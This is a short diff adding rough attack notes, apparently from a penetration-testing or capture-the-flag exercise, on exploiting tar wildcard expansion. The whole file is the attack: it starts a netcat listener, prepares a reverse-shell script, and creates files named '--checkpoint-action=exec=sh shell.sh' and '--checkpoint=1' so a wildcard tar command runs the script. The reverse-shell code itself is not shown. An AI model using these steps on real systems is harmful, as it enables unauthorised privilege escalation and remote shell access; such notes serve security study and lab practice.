@@ -1,0 +1,16 @@
+**WILD CARD ENTRIES VULNERBILITY** COMMANDS**PAYLOADS**
+
+start listener --->nc -lnvp port no.
+
+prepare shell.sh ---> nano shell.sh
+                                      paste revshell code
+                                      save and exit
+                                      chmod +x shell.sh
+
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+
+echo "" > --checkpoint=1
+
+----> execute shell.sh with path
+
+
